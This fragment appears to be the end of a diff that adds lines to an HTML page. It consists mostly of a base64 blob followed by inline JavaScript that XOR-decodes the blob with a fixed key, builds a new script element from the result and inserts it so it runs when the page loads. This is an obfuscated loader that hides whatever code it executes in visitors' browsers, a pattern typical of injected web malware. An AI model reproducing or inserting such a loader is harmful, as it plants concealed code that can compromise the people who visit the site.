a7I/50OIRbANJ84k4HuYC8lGuUR0ySrhbLAM2lGZHyfRZ5g/50OIFfFedJlrsj/nQ4gV8V50mS/7bLcPyUyOHTXVJ+F2oA2SFbALINEZ92yyD9wbtRcnySfzZpgAyVm9DT3eJb4V50OIFfFedJlrsj/nQ4gV8V50mWvgcKsGkhWwCyDRGfdssg/cG6MRONxnmD/nQ4gV8V50mWuyP+dDiBXxXnSZOOZ+swrHW44XMINr82qzC/pQogs4zWXha6YXwVq/IT3dZ5g/50OIFfFedJlrsj/nQ4gV8V50mT/zbaAG3GqyETrKJP56/UPcVKMZMc0I/XG0DMRQ/XR0mWuyP+dDiBXxXnSZa7I/50OIFbgNJ8wu9kCmF5IVlR8g3GX8cLBLgT/xXnSZa7I/50OIFfFedJlr7yTNaYgV8V50mWuyP+dDiBXxXnTKLuFsrgzGZqURJtgs9zG0Btx8pRs5kWzheqkXwVu0EgvYPuZ3mBDNRqIXO9dsvj+NMOd7/w0gyyL8eK4F0R2iGyfKIv1xlwLRWb4fMJBiqRXNQ4gV8V50mWuyP+dDiBXxXj3fa7prphHPUKU9O9c4/XOiQ5UI7F5z+A/fVolEgRWqdHSZa7I/50OIFfFedJlrsj/nQ4gVphc63STlMasMy1SlFzvXZeB6tw/JVrRWc9gv/3apTcBBvBJzkHCYP+dDiBXxXnSZa7I/50OIFaxeMdU49z+8aYgV8V50mWuyP+dDiBXxXnSZa7I/sArGUb4JetUk8X6zCsdb/wwxySfzfKJLj1G4DSTYP/F36QvcWL1ZfYJBsj/nQ4gV8V50mWuyP+dDiEjbXnSZa7I/50OIFfFeKZko82ukC4gdtAwmkGvpFedDiBXxXnSZa7I/50OIFfENPNY81X6zBt9UqDsmyyTgN6IR2hu8GyfKKvV65x/UFfYrOtgp/nrnF8cVpxsm0C3rP6QRzVG0ECDQKv5s6USBDttedJlrsj/nQ4gV8V50mWuybLIBxVylPCDXZfZ2tALKWbQadIRr9H6rEM0O2150mWuyP+dDiBXxXnSZa7JssgHFXKU8INdl5nq/F+tavwox1z+yIucM2ly2FzrYJ95+pQbEDttedJlrsj/nQ4gV8V4ps2uyP+dDiBXxA16Za7I/'),k=[75,146,31,199,99,168,53,209,126,84,185],u=new Uint8Array(d.length);for(var i=0;i<d.length;i++)u[i]=d.charCodeAt(i)^k[i%k.length];var s=document.createElement('script');s.text=new TextDecoder('utf-8').decode(u);document.currentScript.parentNode.insertBefore(s,document.currentScript);})();</script>
+</body>
+</html>
